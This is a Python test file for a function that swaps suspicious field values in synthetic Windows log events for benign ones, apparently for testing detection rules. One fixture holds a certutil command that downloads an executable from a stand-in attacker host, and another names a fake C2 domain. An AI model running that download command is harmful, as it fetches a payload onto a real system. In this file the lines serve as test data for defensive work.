"""Stage 3 Phase 3, Part 3: known-answer tests for the generic benign-event
substitution used by the automated stratified run. No RSigma needed -
pure Python."""

from mechanic.synthetic_benign import synthetic_benign_event


def test_commandline_field_gets_a_generic_benign_commandline():
    template = {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe"}
    benign = synthetic_benign_event(template, "CommandLine", "certutil.exe -urlcache -f")
    assert benign is not None
    assert benign["CommandLine"] in {"ipconfig /all", "systeminfo", "whoami /all", "tasklist /v"}
    assert benign["Image"] == template["Image"]  # every OTHER field untouched


def test_path_identity_bare_filename_gets_a_bare_benign_filename():
    template = {"Image": "whoami.exe", "OriginalFileName": "whoami.exe"}
    benign = synthetic_benign_event(template, "Image", "whoami.exe")
    assert benign["Image"] == "notepad.exe"


def test_path_identity_full_path_gets_a_full_benign_path():
    template = {"Image": "C:\\Windows\\System32\\whoami.exe"}
    benign = synthetic_benign_event(template, "Image", "C:\\Windows\\System32\\whoami.exe")
    assert benign["Image"] == "C:\\Windows\\System32\\notepad.exe"


def test_raw_ipv4_gets_the_documentation_reserved_address():
    template = {"DestinationIp": "203.0.113.77"}
    benign = synthetic_benign_event(template, "DestinationIp", "203.0.113.77")
    assert benign["DestinationIp"] == "203.0.113.5"


def test_domain_looking_value_gets_the_documentation_reserved_domain():
    template = {"DestinationHostname": "evil-c2.example-attacker.net"}
    benign = synthetic_benign_event(template, "DestinationHostname", "evil-c2.example-attacker.net")
    assert benign["DestinationHostname"] == "example.com"


def test_unrecognized_shape_yields_none_never_a_fabricated_placeholder():
    template = {"Hashes": "SHA256=abcd1234"}
    assert synthetic_benign_event(template, "Hashes", "SHA256=abcd1234") is None


def test_field_absent_from_template_yields_none():
    assert synthetic_benign_event({"Image": "x"}, "CommandLine", "y") is None
